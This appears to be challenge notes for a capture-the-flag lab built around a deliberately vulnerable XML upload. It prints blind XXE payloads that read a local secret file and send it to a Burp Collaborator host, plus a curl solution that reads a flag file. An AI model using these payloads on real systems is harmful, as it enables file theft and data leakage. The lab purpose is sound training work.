```
--> Challenge 3  : On WebPage will be an upload option to upload an XML File and a Backend XML Parser which will be vulnerable to BLIND XXE. The

Testing for BLIND XXE through BURP:

				<?xml version="1.0" ?>
				<!DOCTYPE root [
				<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
				]>
				<r></r>

Candidate will have to exploit XXE to read the contents of /home/fakeuser/secret. This will be the third flag.

				<?xml version="1.0" encoding="ISO-8859-1"?>
				<!DOCTYPE foo [
				<!ELEMENT foo ANY >
				<!ENTITY % xxe SYSTEM "file:///home/fakeuser/secret" >
				<!ENTITY exploit SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/%xxe;">
				]
				>
				<foo>&exploit;</foo>


```
Needs old version of PHP (preferable 5) to run.

Have put `header("Accept: application/xml, application/x-www-form-urlencoded");` to give hint for XML.

Solution
```bash
curl 'http://localhost:8000/index.php' \
-H 'content-type: application/xml' \
--data-raw $'<?xml version=\'1.0\' encoding=\'UTF-8\'?><\u0021DOCTYPE XXE [ <\u0021ENTITY xxe SYSTEM \'file:///flag.txt\'> ]><root><text>&xxe;</text></root>'
```
Here `/etc/passwd` to be replaced by the flag path.
